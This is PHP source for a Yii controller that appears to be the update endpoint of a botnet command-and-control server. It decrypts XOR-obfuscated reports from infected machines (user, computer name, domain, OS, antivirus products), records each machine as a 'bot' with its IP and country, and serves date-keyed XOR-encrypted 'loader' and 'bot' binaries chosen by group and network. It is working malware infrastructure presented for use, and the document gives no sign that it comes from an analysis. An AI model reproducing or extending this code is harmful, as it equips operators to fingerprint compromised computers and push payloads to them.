<?php

namespace update\controllers;

use Yii;
use yii\helpers\Json;
use yii\rest\Controller;
use yii\web\UploadedFile;
use yii\helpers\FileHelper;
use common\models\Bots;
use common\models\Commands;
use common\models\Groups;
use common\models\Files;
use yii\base\Security;
use yii\db\Expression;
use yii\web\Request;
use yii\web\HeaderCollection;
use yii\web\NotFoundHttpException;
use common\models\Clones;
use common\models\Networks;

class SiteController extends Controller
{
    public function actionIndex()
    {
        throw new \yii\web\NotFoundHttpException();
    }

    public function actionUpdate()
    {
        $r = explode('/',Yii::$app->request->url);
        $headers = Yii::$app->request->headers;
        //print_r($headers);die();
        if ($headers->has('realip')){
            $real_ip = $headers->get('realip');
        }else{
            $real_ip = '0.0.0.0';
        }

        // where U from?
        $dest = 0; // default
        if($real_ip != '0.0.0.0'){
            $iplower = Networks::findOne(['ipint'=>ip2long($real_ip)]); // hit to single IP or lower mask value
            if($iplower){
                $dest = $iplower->destination;
            }else{ // try range
                $iprange = Networks::find()->where(['>=','ipintto',ip2long($real_ip)])->andWhere(['<=','ipint',ip2long($real_ip)])->one();
                if($iprange && isset($iprange->destination)){
                    $dest = $iprange->destination;
                }
            }
        }
        //print_r($dest);die();
         
        $fileFind = '/'.$r[1].'/'.$r[2];
        $destFile = $r[2];
        
        $chk = '';
        $chk_comm = [
            'l86' => 1001,
            'l64' => 1002,
            'b86' => 1003,
            'b64' => 1004,
            ];
        $chk_dest = [
            'l86' => 10,
            'l64' => 11,
            'b86' => 12,
            'b64' => 13,
            'sl86' => 10,
            'sl64' => 11,
            'sb86' => 12,
            'sb64' => 13,
            ];
        $chk_mess = [
            'l86' => 'loader x86',
            'l64' => 'loader x64',
            'b86' => 'bot x86',
            'b64' => 'bot x64',
            'sl86' => 'loader x86',
            'sl64' => 'loader x64',
            'sb86' => 'bot x86',
            'sb64' => 'bot x64',
            ];


        // prepare file
        // find requested file by update URL
        $g = Groups::find()->andFilterWhere ( [ 'OR' ,
            [ 'l86' => $fileFind ],
            [ 'l64' => $fileFind ],
            [ 'b86' => $fileFind ],
            [ 'b64' => $fileFind ],
        ] )->asArray()->one();
        //print_r($g);die();

        if(Yii::$app->request->isPost){
            $date = str_split(gmdate('Ymd'));
            $d = '';
            for ($i=0; $i < count($date); $i++) { 
                $d .= '3'.$date[$i];
            }
            

            // debug with file
            //$filename = "/home/user/sysinfo.encrypted";
            //$filename = "/var/www/html/backdoor/test.xor";
            //$handle = fopen($filename, "r");
            //$contents = fread($handle, filesize($filename));
            //fclose($handle);
            //$getBody = $this->cryptor($contents,$d);
            //$getBody = $contents;

            // save sysinfo
            $getBody = $this->cryptor(Yii::$app->request->rawBody,$d); // release
            parse_str($getBody,$arr);

            $b = New Bots();
            
            if(array_key_exists('path',$arr)){
                if(gettype($arr['path'])=='string'){
                    $b->path = $arr['path'];
                }
            }

            if(array_key_exists('os',$arr)){
                if(isset($arr['os'])){
                    if(gettype($arr['os'])=='array'){
                        $b->os = json_encode($arr['os']);
                        $b->osbuild = $arr['os'][1];
                    }elseif(gettype($arr['os'])=='string'){
                        $b->os = json_encode(explode('|',$arr['os']));
                        $b->osbuild = $arr['os'][0];
                    }
                }
            }

            if(array_key_exists('arch',$arr)){
                if(gettype($arr['arch'])=='string'){
                    $b->arch = $arr['arch'];
                }
            }
                
            if(array_key_exists('cname',$arr)){
                if(gettype($arr['cname'])=='string'){
                    $b->cname = $arr['cname'];
                }
            }

            if(array_key_exists('uname',$arr)){
                if(gettype($arr['uname'])=='string'){
                    $b->uname = $arr['uname'];
                }
            }

            if(array_key_exists('domain',$arr)){
                if(gettype($arr['domain'])=='string'){
                    $b->domain = $arr['domain'];
                }
            }

            if(array_key_exists('av',$arr) && array_key_exists('avp',$arr)){
                if(isset($arr['av']) && isset($arr['avp'])){
                    if(gettype($arr['av'])=='array' && gettype($arr['avp'])=='array'){
                        $a = array();
                        foreach ($arr['av'] as $key => $value) {
                            array_push($a, [$arr['av'][$key],$arr['avp'][$key]]);
                        }
                        $b->av = json_encode($a);
                    }
                }
            }
            $security = new Security();
            $add = $security->generateRandomString(4);    

            $b->bot = 'Loader'; // bot and group names
            
            if(count($g) > 0){
                $chk = array_search($fileFind, $g[0]); // field prefix
                $b->bot = $chk_mess[$chk];
                $b->group = $g[0]['group'];
            }

            if(array_key_exists('ver',$arr)){
                if(gettype($arr['ver'])=='string'){
                    $b->bot .= ' '.$arr['ver'];
                }
            }

            $b->bot .= ' '.$add;

            // Search for network
            $b->type = $dest; // default
            
            /*if($real_ip != '0.0.0.0'){
                $iplower = Networks::findOne(['ipint'=>ip2long($real_ip)]); 
                if($iplower){
                    $b->type = $iplower->destination;
                }else{ // try range
                    $iprange = Networks::find()->where(['>=','ipintto',ip2long($real_ip)])->andWhere(['<=','ipint',ip2long($real_ip)])->one();
                    if($iprange && isset($iprange->destination)){
                        $b->type = $iprange->destination;
                    }
                }
                
            }*/
            

            $b->busy = 0; // unblock bot
            $b->updated_at = new Expression('NOW()');
            $b->created_at = new Expression('NOW()');
            $b->status = 3;
            $b->ip = $real_ip;
            $b->country = Yii::$app->geoip->lookupCountryCode($real_ip);
            $b->save(false);
                
                    
        }
        //print_r($g['group'].' '.$fileFind);die();
        if(count($g) > 0){
            $chk = array_search($fileFind, $g); // field prefix
            $group = $g['group'];
            $s = ($dest==2) ? 's' : ''; // for test networks

            if(isset($group) && $group != ''){
                // search for command force update
                $c = Commands::find()->where(['>=','commandtype',$chk_comm[$chk]])->andWhere(['ip'=>$real_ip])->andWhere(['group'=>$group])->orderBy(['created_at' => SORT_DESC])->one();
                if(isset($c->created_at)){ // if exist
                    if($c->created_at > $g[$chk.'_created_at']){
                        $sourceFile = explode(' ',$c->command)[1]; // set file from command
                    }else{ // get any required file from storage
                        $f = Files::find()->where(['group'=>$group])->andWhere(['destination'=>$chk_dest[$chk]])->asArray()->all();
                        if(count($f) > 0){
                            $sourceFile = $f[0]['storedfilename'];
                        }
                        
                    }
                }else{
                    //$f = Files::find()->where(['group'=>$group])->andWhere(['actual'=>1])->andWhere(['destination'=>$chk_dest[$chk]])->asArray()->all();
                    //$f = Files::find()->where(['group'=>$group])->andWhere(['destination'=>$chk_dest[$chk]])->asArray()->all();
                    $f = Files::findOne(['storedfilename'=>$g[$s.$chk.'_source']]);
                    if($f){
                        $sourceFile = $f->storedfilename;
                    }
                    //print_r($sourceFile);die();
                }
            }
            Yii::info('Group '. $group . ' update '.$chk_mess[$chk].' started from '.$real_ip, $category = 'loaderinfo');
        }
        
        if(isset($sourceFile)){
            $sourceFile = Yii::getAlias('@absPath').$sourceFile;
            $date = str_split(date('Ymd'));
            $d = '';
            for ($i=0; $i < count($date); $i++) { 
                $d .= '3'.$date[$i];
            }
            $wf = Yii::$app->security->generateRandomString(20);
            $webFileName =  Yii::getAlias('@absPath').'/update/web/update/'.$wf;

            FileHelper::createDirectory(Yii::getAlias('@absPath').'/update/web/update');

            $shellcommand = 'cd '.Yii::getAlias('@absPath').'/utilities; ./xor '.$d.' '.$sourceFile.' '.$webFileName;

            // fix clone
            $clone = New Clones();
            $clone->source = $sourceFile;
            $clone->clone = '/'.$wf;
            $clone->clonetype = 1; // file for updates
            $clone->save(false);

            // Big file bug catcher
            if(file_exists($sourceFile)){
                $e = shell_exec($shellcommand);



                Yii::info('File '.$sourceFile.' crypted to '.$webFileName.'with result'.$e, $category = 'loaderinfo');

                Yii::$app->response->sendFile($webFileName, Yii::$app->getRequest()->getQueryParam('file'))->send();

            }else{
                Yii::info('File '.$sourceFile.' is not exist! Thying to crypt to: '.$webFileName.'Info: '.$fileFind.' '.$chk, $category = 'loaderinfo');
                //throw new NotFoundHttpException('40414.');
                die();
            }
        }
    }

    public function cryptor($source, $key)
    {
        // return $source; // comment line to use cryptor

        $t = str_split($source);

        $res = '';

        $key_array = str_split($key,2);
        foreach ($key_array as $k => $value) {
            $key_array[$k] = hexdec($value);
        }
        
        $parts = str_split($source,count($key_array));
        
        foreach ($parts as $value_parts) {
            $xor_array = array();
            
            $value_array = str_split($value_parts);

            foreach ($value_array as $k => $value) {
                $value_array[$k] = ord($value);
            }

            for ($j = 0; $j < min(count($value_array),count($key_array)); $j++){
                $s = dechex($value_array[$j] ^ $key_array[$j]);

                if(strlen($s)==1){
                    $s = '0'.$s;
                }
                array_push($xor_array, hex2bin($s));
            }

            foreach ($xor_array as $k => $value) {
                $res .= $value;
            }
        }

        return $res;
    }
}
